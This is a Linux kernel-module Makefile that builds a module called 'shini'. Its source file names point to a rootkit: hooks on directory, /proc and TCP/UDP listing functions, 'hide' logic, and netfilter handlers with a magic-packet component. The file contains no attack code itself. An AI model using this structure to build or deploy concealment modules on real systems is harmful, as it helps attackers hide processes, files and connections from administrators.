KDIR = /lib/modules/$(shell uname -r)/build

EXTRA_CFLAGS := -Wno-strict-prototypes -Werror  	\
                -I$(src)/../src/include                	\
                -I$(src)/../src/hook/			\
                -I$(src)/../src/logic/			\
                -I$(src)/../src/hooked/			\
                -I$(src)/../src/net/			\
		-I$(src)/../src/module/			\
		-I$(src)/../src/misc/			\
		-I$(src)/../src/net/			\
		-I$(src)/../src/net/include

obj-m += shini.o

shini-y := ../src/module/main.o			\
	   ../src/module/module.o		\
	   ../src/hook/get_op.o			\
	   ../src/hook/patch.o			\
	   ../src/hook/pte.o			\
	   ../src/hook/sym_map.o		\
	   ../src/hooked/inet_ioctl.o		\
	   ../src/hooked/root_iterate.o         \
	   ../src/hooked/proc_iterate.o         \
	   ../src/hooked/udp4_seq_show.o        \
	   ../src/hooked/udp6_seq_show.o        \
	   ../src/hooked/tcp4_seq_show.o        \
	   ../src/hooked/tcp6_seq_show.o        \
	   ../src/logic/hidden.o		\
	   ../src/logic/hide.o			\
	   ../src/logic/cmd.o			\
	   ../src/logic/list_hidden.o		\
	   ../src/net/nf_hook.o			\
	   ../src/net/nf_hook_register.o	\
	   ../src/net/watcher.o			\
	   ../src/net/m_packet.o		\
	   ../src/net/m_helper.o

all:
	$(MAKE) -C $(KDIR) M=$(PWD)

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

